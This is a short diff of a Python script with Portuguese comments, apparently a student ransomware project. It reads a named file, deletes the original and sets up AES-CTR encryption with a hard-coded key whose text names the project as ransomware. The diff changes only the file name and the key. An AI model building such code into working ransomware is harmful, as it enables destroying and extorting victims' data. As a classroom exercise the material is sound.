@@ -2,7 +2,7 @@ import os
 import pyaes
 
 ## abrir o arquivo a ser criptografado
-file_name = "projetofinal.txt"
+file_name = "projetomcs.txtt"
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
@@ -11,7 +11,7 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"projetoransomwares"
+key = b"ransomwaremcspro"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
